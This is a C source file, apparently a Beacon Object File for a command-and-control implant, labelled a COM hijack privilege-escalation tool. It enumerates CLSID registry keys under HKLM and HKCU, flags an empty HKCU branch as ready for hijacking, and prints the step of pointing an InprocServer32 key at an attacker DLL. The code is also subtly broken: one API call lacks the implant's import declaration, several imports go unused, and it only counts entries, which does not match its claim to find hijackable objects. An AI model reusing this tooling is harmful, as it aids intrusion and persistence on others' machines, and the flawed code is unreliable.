/*
 * com_privesc.c - COM hijack privesc
 * Scans for hijackable COM objects
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegEnumKeyExA(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    HKEY hKey = NULL;
    BeaconPrintf(CALLBACK_OUTPUT, "=== COM Hijack Privesc ===");

    /* Check HKLM CLSID count (potential targets) */
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Classes\\CLSID",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        DWORD subKeys = 0;
        DWORD maxSubKeyLen = 0;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        BeaconPrintf(CALLBACK_OUTPUT, "HKLM CLSID entries: %lu", subKeys);
        ADVAPI32$RegCloseKey(hKey);
    }

    /* Check HKCU CLSID (already hijacked?) */
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Classes\\CLSID",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        DWORD subKeys = 0;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (subKeys > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "HKCU CLSID entries: %lu (existing hijacks?)", subKeys);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "HKCU CLSID: empty (clean slate for hijack)");
        }
        ADVAPI32$RegCloseKey(hKey);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "To hijack: write HKCU\\Software\\Classes\\CLSID\\{guid}\\InprocServer32 = <dll_path>");
}
